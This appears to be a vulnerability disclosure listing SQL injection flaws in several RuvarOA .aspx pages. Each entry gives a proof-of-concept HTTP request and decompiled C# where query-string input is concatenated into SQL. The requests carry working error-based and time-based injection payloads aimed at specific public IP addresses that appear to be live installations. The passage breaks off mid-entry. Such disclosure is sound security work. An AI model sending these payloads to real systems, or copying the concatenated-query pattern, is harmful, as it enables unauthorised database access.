<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">SQl Injection</h2><a id="user-content-sql-injection" class="anchor" aria-label="Permalink: SQl Injection" href="#sql-injection"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">plan_template_preview.aspx</h3><a id="user-content-plan_template_previewaspx" class="anchor" aria-label="Permalink: plan_template_preview.aspx" href="#plan_template_previewaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path" class="anchor" aria-label="Permalink: path" href="#path"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">/WorkPlan/plan_template_preview.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc" class="anchor" aria-label="Permalink: POC" href="#poc"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /WorkPlan/plan_template_preview.aspx?template_id=1+and+(select+@@version)&gt;0+--+ HTTP/1.1
Host: 112.74.79.113:8000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302553580-683775d2-56b7-4a7a-8480-7a5529807b3b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1NTM1ODAtNjgzNzc1ZDItNTZiNy00YTdhLTg0ODAtN2E1NTI5ODA3YjNiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWMzY2Y1Y2JhMTQyZTNhYWY2MTQ1NjY1MmE3MTdjYzQzZjIzMGJmNDMzYTA3MjJhODk5NTM3ODJkZWY1YTY2ZjcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.c20SW-RYqk6VBszg7vW4axPbNNoja5va_LwpNkQz2PU"><img width="1001" alt="image" src="https://private-user-images.githubusercontent.com/18260135/302553580-683775d2-56b7-4a7a-8480-7a5529807b3b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1NTM1ODAtNjgzNzc1ZDItNTZiNy00YTdhLTg0ODAtN2E1NTI5ODA3YjNiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWMzY2Y1Y2JhMTQyZTNhYWY2MTQ1NjY1MmE3MTdjYzQzZjIzMGJmNDMzYTA3MjJhODk5NTM3ODJkZWY1YTY2ZjcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.c20SW-RYqk6VBszg7vW4axPbNNoja5va_LwpNkQz2PU" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function plan_template_preview within the DLL file /RuvarOA/bin/WorkPlan.dll</p>
<pre><code>using System;
using System.Data;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using Lib;

namespace WorkPlan;

public class plan_template_preview : Page
{
    protected HtmlHead Head1;

    protected HtmlForm form1;

    protected HtmlGenericControl divContent;

    protected TextBox txt_template_formula;

    protected TextBox txt_template_sumfield;

    protected void Page_Load(object sender, EventArgs e)
    {
        DataView dataView = SqlHelper.QueryView("select top 1 * from workplan_template_info where id=" + ((Page)this).Request.QueryString["template_id"]);
        if (dataView.Count &gt; 0)
        {
            txt_template_formula.Text = dataView[0]["template_formula"].ToString();
            txt_template_sumfield.Text = dataView[0]["template_sumfield"].ToString();
            ((Page)this).Title = dataView[0]["template_title"].ToString() + " -- 模版预览";
            ((HtmlContainerControl)divContent).InnerHtml = dataView[0]["template_content"].ToString();
        }
        dataView.Dispose();
    }
}

</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["template_id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">bulletin_template_show.aspx</h3><a id="user-content-bulletin_template_showaspx" class="anchor" aria-label="Permalink: bulletin_template_show.aspx" href="#bulletin_template_showaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-1" class="anchor" aria-label="Permalink: path" href="#path-1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">bulletin/bulletin_template_show.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-1" class="anchor" aria-label="Permalink: POC" href="#poc-1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /bulletin/bulletin_template_show.aspx?id=1 HTTP/1.1
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.4103.116 Safari/537.36
Host: 112.74.79.113:8000
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close


</code></pre>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-1" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function bulletin_template_show within the DLL file /RuvarOA/bin/bulletin.dll</p>
<pre><code>using System;
using System.Data;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using Lib;

namespace bulletin;

public class bulletin_template_show : Page
{
    protected HtmlForm Form1;

    protected HtmlGenericControl divTitle;

    protected HtmlGenericControl divContent;

    protected Literal lt_visible;

    protected TextBox txt_id;

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!((Page)this).IsPostBack)
        {
            txt_id.Text = ((Page)this).Request.QueryString["id"];
            if (Validate.isNullOrSpace(txt_id.Text))
            {
                txt_id.Text = "0";
            }
            DataView dataView = SqlHelper.QueryView("select top 1 * from office_bulletin_template where id=" + txt_id.Text);
            if (dataView.Count &gt; 0)
            {
                ((HtmlContainerControl)divTitle).InnerHtml = dataView[0]["b_title"].ToString();
                ((HtmlContainerControl)divContent).InnerHtml = dataView[0]["b_content"].ToString();
            }
            dataView.Dispose();
        }
    }
}


</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">wf_file_download.aspx</h3><a id="user-content-wf_file_downloadaspx" class="anchor" aria-label="Permalink: wf_file_download.aspx" href="#wf_file_downloadaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-2" class="anchor" aria-label="Permalink: path" href="#path-2"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Mobile/WorkFlow/wf_file_download.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-2" class="anchor" aria-label="Permalink: POC" href="#poc-2"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /Mobile/WorkFlow/wf_file_download.aspx?attach_type=1&amp;sys_file_storage_id=1+waitfor+delay+'0:0:3'+--+ HTTP/1.1
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.4103.116 Safari/537.36
Host: 121.33.254.78:88
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302563452-0c282a4f-c2b9-4440-80be-f17b9c1e9b78.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1NjM0NTItMGMyODJhNGYtYzJiOS00NDQwLTgwYmUtZjE3YjljMWU5Yjc4LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTBjMGE3N2E0YTEzZWMwMzBjOTIxYWZmMTFkNTBlMDYyNTAzOTIyYjAzY2ZhMGZkMjNhYzgxMWRkNGMyODhkNzYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.1Tzh4aMKL5NEn6y0skUS96LugoEWVh8Jbd89gyNQizs"><img width="990" alt="image" src="https://private-user-images.githubusercontent.com/18260135/302563452-0c282a4f-c2b9-4440-80be-f17b9c1e9b78.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1NjM0NTItMGMyODJhNGYtYzJiOS00NDQwLTgwYmUtZjE3YjljMWU5Yjc4LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTBjMGE3N2E0YTEzZWMwMzBjOTIxYWZmMTFkNTBlMDYyNTAzOTIyYjAzY2ZhMGZkMjNhYzgxMWRkNGMyODhkNzYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.1Tzh4aMKL5NEn6y0skUS96LugoEWVh8Jbd89gyNQizs" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-2" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-2"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function wf_file_download within the DLL file /RuvarOA/bin/Mobile.dll</p>
<pre><code>public class wf_file_download : Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if (((Control)this).Page.IsPostBack)
        {
            return;
        }
        try
        {
            string text = "";
            text = ((Page)this).Request.QueryString["sys_file_storage_id"];
            string text2 = ((Page)this).Request.QueryString["attach_type"];
            if (Validate.isNullOrSpace(text2))
            {
                text2 = "0";
            }
            if (text2 == "1")
            {
                string sQLString = "SELECT * FROM wf_office_file WHERE word_file_id=" + text + "  ";
                DataView dataView = SqlHelper.QueryView(sQLString);
                if (dataView.Count &gt; 0)
                {
                    byte[] array = (byte[])dataView[0]["filedata"];
                    dataView.Dispose();
                    ((Page)this).Response.Clear();
                    ((Control)this).Page.Response.ContentType = "application/msword";
                    ((Control)this).Page.Response.AddHeader("Content-Disposition", "attachment; filename=zhengwen.doc;");
                    ((Page)this).Response.BinaryWrite(array);
                }
                dataView.Dispose();
                return;
            }
            if (text != "" &amp;&amp; text != null)
            {
                FileDownLoad fileDownLoad = new FileDownLoad();
                fileDownLoad.DownLoad(((Control)this).Page, text);
                return;
            }
            string text3 = "";
            string text4 = "";
            string text5 = "";
            text3 = ((Page)this).Request.QueryString["table_id"];
            text4 = ((Page)this).Request.QueryString["table_name"];
            text5 = ((Page)this).Request.QueryString["upload_type"];
            if (text3 != "" &amp;&amp; text3 != null &amp;&amp; text4 != "" &amp;&amp; text4 != null)
            {
                FileDownLoad fileDownLoad = new FileDownLoad();
                if (text5 == "" || text5 == null)
                {
                    fileDownLoad.DownLoad(((Control)this).Page, text4, text3);
                }
                else
                {
                    fileDownLoad.DownLoad(((Control)this).Page, text4, text3, text5);
                }
            }
        }
        catch
        {
        }
    }


</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["sys_file_storage_id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.
But need attach_type value 1.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">address_public_show.aspx</h3><a id="user-content-address_public_showaspx" class="anchor" aria-label="Permalink: address_public_show.aspx" href="#address_public_showaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-3" class="anchor" aria-label="Permalink: path" href="#path-3"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">AddressBook/address_public_show.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-3" class="anchor" aria-label="Permalink: POC" href="#poc-3"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 